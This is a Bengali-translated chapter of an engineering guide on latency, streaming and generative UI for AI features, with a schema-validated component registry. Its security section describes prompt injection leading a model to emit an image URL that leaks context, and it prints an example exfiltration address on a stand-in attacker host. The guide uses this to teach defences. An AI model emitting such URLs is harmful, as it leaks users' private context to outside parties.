---
sourceHash: "552f3b23c85361bd997d92ab03fd91051cbfa883af4a0d3f300954639252ff89"
title: "Latency ও Generative UI"
translatedAt: "2026-10-13T03:06:13.172Z"
model: "claude-opus-5-5 (Claude Code)"
---

# Latency ও Generative UI {#ch-generative-ui}

> কয়েক সেকেন্ডের একটি উত্তরকে responsive মনে করান, তারপর model-কে একটি নির্দিষ্ট allow-list থেকে আপনার component বাছতে দিন, কোনো ফাঁক না খুলে।

**এই অধ্যায়ে:** time to first token · user অপেক্ষা করার সময় কী দেখাবেন · দীর্ঘ সময় ধরে চলা কাজ · component registry · model-এর বাছা props-এর security boundary

## 💡 মূল ধারণা

একটি AI feature-এর সৎ ন্যূনতম সময় হলো **প্রথম token পর্যন্ত কয়েকশো millisecond, আর পুরো উত্তর পর্যন্ত কয়েক সেকেন্ড**।
Model একবারে একটি করে token তৈরি করে, তাই কোনো engineering এই অপেক্ষা সরাতে পারে না। একে দ্রুত করা যাবে না, তাই একে
responsive মনে করান। আগেভাগে progress দেখান, সেটা চলমান রাখুন, user-কে পড়ার মতো কিছু দিন।

উত্তর এসে গেলে, গদ্য প্রায়ই ভুল আকার। গত quarter-এর revenue নিয়ে একটি প্রশ্নের দরকার একটি chart, একটি table আর একটি
link। **Generative UI model-কে component বাছতে দেয়, অথচ কোন component আছে আর সেগুলো কী পেতে পারে, তার মালিক আপনার
code।** Model একটি branch বাছে। সে code লেখে না।

> User-রা একটি ধীর উত্তর ক্ষমা করেন। যে interface তাঁদের কিছুই দেখায় না, সেটা ক্ষমা করেন না।

## কীভাবে কাজ করে

### Latency budget

| ধাপ | সাধারণত | কমানো যায়? |
| --- | --- | --- |
| আপনার server পর্যন্ত network | 20–80 ms | সামান্য |
| Retrieval | 50–400 ms | হ্যাঁ — index, *k*, reranking |
| Prompt assembly | 1–20 ms | খুব কমই কষ্টের মূল্য দেয় |
| **Time to first token** | 200 ms – 2 s | হ্যাঁ — ছোট model, ছোট prompt, caching |
| Token generation | 20–150 tokens/s | শুধু কম generate করে |

**User-রা যে সংখ্যাটা টের পান, সেটা time to first token।** যে উত্তর 400 ms-এ শুরু হয়ে আট সেকেন্ডে শেষ হয়, সেটা
চার সেকেন্ডে শুরু হয়ে পাঁচ সেকেন্ডে শেষ হওয়া উত্তরের চেয়ে ভালো লাগে। Retrieval আর reranking পুরোপুরি প্রথম token-এর
আগে বসে। Documentation assistant-এ 400 ms-এর একটি reranker চোখে পড়ার মতো প্রতিটি byte-কে দেরি করায়। Prompt-এর দৈর্ঘ্যও
first-token-এর সময়ে প্রভাব ফেলে। বিশটি নয়, পাঁচটি ভালো chunk পাঠানোর এটা আরেকটি কারণ।

Page-এর এখনো একটি INP target আছে (input-এ কত দ্রুত সাড়া দেয়), আর প্রতিটি token-এ re-render হওয়া একটি pane সেটায়
fail করবে। [Chapter ?? — Core Web Vitals](#ch-core-web-vitals) দেখুন।

### অপেক্ষার সময়টা কী দিয়ে ভরাবেন

| সময় | কী দেখাবেন | কেন |
| --- | --- | --- |
| 300 ms-এর কম | কিছুই না | এক ঝলক দেখা দেওয়া spinner না থাকার চেয়েও খারাপ |
| 300 ms – 1 s | একটি সূক্ষ্ম indicator | Input পাওয়া গেছে তা জানান |
| 1–3 s | নাম দেওয়া একটি ধাপ: "docs-এ খোঁজা হচ্ছে" | এমন progress, যার অর্থ আছে |
| 3–10 s | Stream করা content | উত্তর নিজেই progress bar |
| 10 s-এর বেশি | ধাপে ধাপে progress, একটি cancel button | User-এর নিয়ন্ত্রণ দরকার |

Team-রা তৃতীয় সারিটা বাদ দেয়। **একটি ধাপের label তথ্য, সাজসজ্জা নয়।** "Docs-এ খোঁজা হচ্ছে" দেখায় system প্রশ্নটা
কীভাবে পড়েছে, তাই যে user-এর প্রশ্ন ভুল বোঝা হয়েছে, তিনি আট সেকেন্ড পরে নয়, এখনই থামাতে পারেন।

Streaming একটি লম্বা অপেক্ষাকে একটি আগেভাগে শুরুতে পরিণত করে, তারপর text আসে মানুষ যত দ্রুত পড়ে তার চেয়েও দ্রুত।
Transport-এর কথা আছে [Chapter ?? — Streaming Response](#ch-streaming-responses)-এ। Interface-এর নিয়মগুলো এই:

- **প্রতিটি token এসে পৌঁছানো মাত্র render করুন।** বাক্যের শেষ পর্যন্ত buffer করলে সেই অপেক্ষা ফিরে আসে, যেটা সরাতে
  আপনি খরচ করেছেন।
- **Layout স্থির রাখুন।** জায়গা আগে থেকে রেখে দিন, যাতে প্রতিটি chunk-এ container reflow না হয়।
- **User-কে পেরিয়ে কখনো auto-scroll করবেন না।** নিচে pin করে রাখুন শুধু তখনই, যখন তিনি ইতিমধ্যে নিচে আছেন।
- **প্রথম token থেকেই একটি cancel control দেখান।** সময় আর খরচের ওপর user-এর একমাত্র নিয়ন্ত্রণ এটাই।

### উত্তর আসার আগের কাজ

Input-এ focus হলেই retrieval prefetch করা, একটি keystroke-এ connection গরম করা, আর user-এর message সাথে সাথে দেখিয়ে
দেওয়া প্রায় বিনা খরচের। সম্ভাব্য একটি প্রশ্নের জন্য আন্দাজে model call করা তা নয়। অব্যবহৃত একটি call মানে অকারণে
খরচ করা টাকা, আর বড় scale-এ এই নষ্ট call-গুলো দ্রুত জমে যায়।

> ⚠️ এখানে optimistic UI-এর মানে কম। একটি request শুরু হয়েছে, তা আপনি সাথে সাথে দেখাতে পারেন। উত্তরটা আগেভাগে দেখাতে
> পারেন না, কারণ আপনি সেটা জানেন না। যে interface user-এর হয়ে আন্দাজ করে, সেটা কাজ চলছে বলে স্বীকার করা interface-এর
> চেয়ে খারাপ।

### দীর্ঘ সময় ধরে চলা কাজ

দশ সেকেন্ড পেরিয়ে গেলে একটি chat window ভুল আকার। কয়েক মিনিটের একটি agent run-এর দরকার একটি background job-এর
সরঞ্জাম: চোখে দেখা যায় এমন একটি plan, ধাপের progress, এমন একটি cancel যেটা সত্যিই থামায়, আর এমন একটি result যেটা page
ছেড়ে গেলেও টিকে থাকে। আগে plan দেখান। ভুল বোঝা একটি কাজ বারো নম্বর ধাপে নয়, এক নম্বর ধাপে থামালে সময় আর টাকা দুটিই
বাঁচে।

### Component registry

**Registry আর renderer — নামটা একটি lookup, props validate করা হয়**

```tsx
const registry = {
  chart: {
    schema: z.object({
      kind: z.enum(['line', 'bar']),
      series: z.array(z.object({ label: z.string().max(40), value: z.number() })).max(50),
    }),
    Component: Chart,
  },
  citation: {
    schema: z.object({ chunkId: z.string() }),   // an id, not a URL — see below
    Component: Citation,
  },
} as const;

function render(name: string, props: unknown) {
  const entry = registry[name as keyof typeof registry];
  if (!entry) return <Fallback />;                       // unknown name: render nothing special
  const parsed = entry.schema.safeParse(props);
  if (!parsed.success) return <Fallback />;              // bad props: never partially render
  return <entry.Component {...parsed.data} />;
}
```

তিনটি জিনিস এটাকে নিরাপদ করে। **অচেনা একটি নাম একটি fallback render করে**, model-এর বানানো কিছু কখনোই নয়। **Render-এর
আগে props যাচাই হয়**, তাই একটি field না থাকলে একটি fallback আসে, ভাঙা component নয়। **সীমা থাকে schema-তে**, যেমন 50টি
point আর 40টি character। খোলামেলা একটি array পেলে model কখনো কখনো বিশাল একটি array তৈরি করে।

Model block বের করে [Chapter ?? — Structured Output](#ch-structured-output)-এর মাধ্যমে। একটি discriminated union বেশিরভাগ
অবৈধ নাম decoding-এর ধাপেই থামিয়ে দেয়, fallback দরকার হওয়ার আগেই।

**Output schema — model শুধু সেই component-গুলোর নাম বলতে পারে, যেগুলো আছে**

```typescript
const UiBlock = z.discriminatedUnion('component', [
  z.object({ component: z.literal('chart'), props: registry.chart.schema }),
  z.object({ component: z.literal('citation'), props: registry.citation.schema }),
]);
```

### Security boundary

প্রতিটি prop এমন একটি value, যেটা model তৈরি করেছে, আংশিকভাবে এমন document থেকে যেগুলো আপনি নিয়ন্ত্রণ করেন না। Props-কে
একটি attack surface হিসেবে দেখুন।

| Prop-এর type | ঝুঁকি | নিয়ম |
| --- | --- | --- |
| Text | Inject করা instruction তথ্য হিসেবে দেখানো | Text হিসেবে render করুন, কখনোই HTML হিসেবে নয় |
| URL (`href`, `src`) | Data বের করার channel, phishing-এর লক্ষ্য | Origin allow-list করুন, অথবা একটি id পাঠিয়ে server-এ resolve করুন |
| Markdown | Script, image, যেকোনো link | Tag আর attribute-এর একটি কঠোর allow-list |
| একটি id | নিরাপদ | User যা দেখতে পারেন, তার সাথে মিলিয়ে server-এ resolve করুন |
| Raw HTML | Cross-site scripting | কখনোই না |

URL-এর সারিটাই সবচেয়ে গুরুত্বপূর্ণ, যেমনটা [Chapter ?? — Prompt Injection](#ch-prompt-injection) ব্যাখ্যা করে। Model-এর
নিয়ন্ত্রিত একটি image source একটি বাইরের channel: `https://attacker.example/x.png?d=<context>` render হওয়ামাত্র data ফাঁস
করে, কোনো click ছাড়াই। Render করার একটি সিদ্ধান্ত lethal trifecta-র তৃতীয় পা যোগ করে দিয়েছে।

**Id পাঠান, server-এ resolve করুন।** Documentation assistant-এ একটি citation একটি chunk id বহন করে। Server সেটাকে একটি
link-এ পরিণত করে শুধু তখনই, যদি সেই chunk এই user-এর জন্য retrieve করা হয়ে থাকে।

> ⚠️ Image চালু রেখে model-এর output Markdown হিসেবে render করা একটি data বের করার channel, যদি না image source সীমিত
> করা থাকে। Generative UI-তে এটাই সবচেয়ে বেশি চোখ এড়িয়ে যাওয়া ফাঁক।

### আংশিক একটি component stream করা

একটি object আসে field ধরে ধরে, তাই props সম্পূর্ণ হওয়ার আগেই একটি component render হতে পারে। Schema validate না হওয়া
পর্যন্ত একটি skeleton দেখান। পঞ্চাশটির মধ্যে তিনটি point-সহ একটি chart ভুল, progressive নয়। Progressive rendering text-এর
জন্য মানানসই, এমন কিছুর জন্য নয় যেটা user একটি সংখ্যা হিসেবে পড়েন। আংশিক props-এ কখনো side effect চালাবেন না, কারণ
আংশিক একটি object কোনো সিদ্ধান্ত নয়।

## কখন ব্যবহার করবেন

| Feature | Design |
| --- | --- |
| Chat বা documentation assistant | Stream, ধাপের label, cancel; text আর citation block |
| নানা রকম প্রশ্নসহ data assistant | Chart, table আর text block-সহ একটি registry |
| অল্প কয়েকটি জানা উত্তরের আকার | একটি classifier কয়েকটি template-এর একটি বাছে — কোনো generation নেই |
| যা কিছু লেখে বা খরচ করে | Template, সাথে একটি স্পষ্ট confirmation ধাপ |
| কয়েক মিনিটের agent run | Background-job UI: plan, progress, cancel, টিকে থাকা একটি result |

বেশিরভাগ "generative UI"-এর চাহিদা মেটে একটি classifier পাঁচটি layout-এর একটি বাছলেই। এটা দ্রুততর, সস্তা, test করা যায়,
আর কোনো নতুন security surface যোগ করে না। বানানোর আগে মাপুন generation আদৌ দরকার কিনা।

## সাধারণ ভুল

**❌ আট সেকেন্ডের অপেক্ষার জন্য একটি spinner**

> এটা কিছুই বলে না, আর সময়টা আরও ধীর মনে হয়। Stream করুন, অন্তত ধাপটার নাম বলুন।

**✅ ধাপের নাম বলুন আর প্রথম token থেকেই stream করুন**

> "Docs-এ খোঁজা হচ্ছে" একই সাথে progress আর শুধরে নেওয়ার একটি সুযোগ। User ভুল বোঝা একটি request আগেভাগে থামাতে পারেন।

**❌ Model-কে URL, HTML বা অবাধ Markdown দিতে দেওয়া**

> Model-এর নিয়ন্ত্রিত একটি `src` বা `href` একটি বাইরের channel। Raw HTML হলো নতুন পথে আসা cross-site scripting।

**✅ সীমাবদ্ধ একটি schema-র সাথে props validate করুন, id পাঠান, আর ব্যর্থ হলে fallback-এ যান**

> Fallback একটি ভালো ফলাফল। Undefined props-সহ আধা-render হওয়া একটি component তা নয়।

## 🔑 মূল শিক্ষা

- User-রা যে latency টের পান, সেটা time to first token, আর retrieval পুরোপুরি তার আগে বসে।
- ধাপের নাম বলুন, প্রতিটি token stream করুন, layout স্থির রাখুন, আর একজন পাঠককে পেরিয়ে কখনো auto-scroll করবেন না।
- দশ সেকেন্ড পেরোলে background-job interface ব্যবহার করুন: চোখে দেখা plan, progress, cancel আর টিকে থাকা result।
- Model আপনার লেখা একটি registry থেকে বাছে, আর কিছু render হওয়ার আগে তার props একটি সীমাবদ্ধ schema পার হয়।
- Model-এর দেওয়া URL একটি data বের করার channel, তাই id পাঠান আর server-এ resolve করুন।

## Interview-এর প্রশ্ন

**Q: Model আট সেকেন্ড নেয়। User কী দেখেন?**

Spinner নয়। Stream করা text কয়েকশো millisecond-এর মধ্যে শুরু হওয়া উচিত, যাতে অপেক্ষাটা একটি আগেভাগে শুরুতে পরিণত হয়,
তারপর text আসে তাঁরা যত দ্রুত পড়েন তার চেয়েও দ্রুত। প্রথম token-এর আগে retrieval তখনো চলছে, তাই আমি সেই ধাপের নাম বলি।
এটা যেকোনো model upgrade-এর চেয়ে দ্রুত মনে হয়, আর এটা একটি frontend পরিবর্তন।

**Q: আপনি এমন একটি reranker যোগ করলেন, যেটা উত্তর ভালো করে আর 300 ms খরচ করে। এটা কি লাভজনক?**

নির্ভর করে 300 ms কোথায় পড়ছে, আর এখানে এটা পুরোপুরি প্রথম চোখে পড়া byte-এর আগে পড়ছে। তাই এটা বিনা খরচের জয় নয়।
আমি দেখতে চাইব retrieval eval recall@5-এ সত্যিকারের উন্নতি দেখাচ্ছে। ছোট একটি corpus-এ, যেখানে উত্তর ইতিমধ্যে প্রথম পাঁচে
আছে, এটা শুধুই latency।

**Q: Model-এর output থেকে component render করার ঝুঁকি কী, আর কীভাবে সেটা আটকান?**

Output এমন একটি system-এর অবিশ্বস্ত input, যেটা attacker-এর নিয়ন্ত্রণে থাকতে পারে এমন document পড়ে। তাই model একটি
discriminated union-এর মাধ্যমে শুধু আমার registry-র component-এর নাম বলতে পারে, আর প্রতিটি prop একটি সীমাবদ্ধ schema পার
হয়। অচেনা বা অবৈধ যেকোনো কিছু একটি fallback render করে। ধারালো দিকটা হলো URL: model-এর নিয়ন্ত্রিত একটি image source
render হওয়ামাত্র context ফাঁস করে, কোনো click ছাড়াই।

**Q: কখন আপনি generative UI বানাবেন না?**

যখন উত্তরের আকার অল্প আর অনুমানযোগ্য, যা বেশিরভাগ সময়েই হয়। পাঁচটি template-এর মধ্যে বাছাই করা একটি classifier সস্তা,
দ্রুততর, deterministic, test করা যায়, আর কোনো security surface যোগ করে না। আমি generation-এর দিকে যাই শুধু তখন, যখন উত্তর
data-র সাথে এমনভাবে বদলায়, যা আমি তালিকা করে বলতে পারি না। Side effect আছে এমন যেকোনো কিছু স্পষ্ট confirmation-সহ একটি
template-এই থাকে।

## এরপর কী পড়বেন

- [Chapter ?? — Streaming Response](#ch-streaming-responses) — যে transport আগেভাগে token পাঠানো সম্ভব করে
- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — model-এর দেওয়া একটি URL কেন একটি security সিদ্ধান্ত
- [Chapter ?? — বিশ্বাস, নির্ভুলতা ও Failure State](#ch-trust-and-correctness-ux) — একটি citation block কীসের জন্য, আর এটা ব্যর্থ হলে interface কী করে
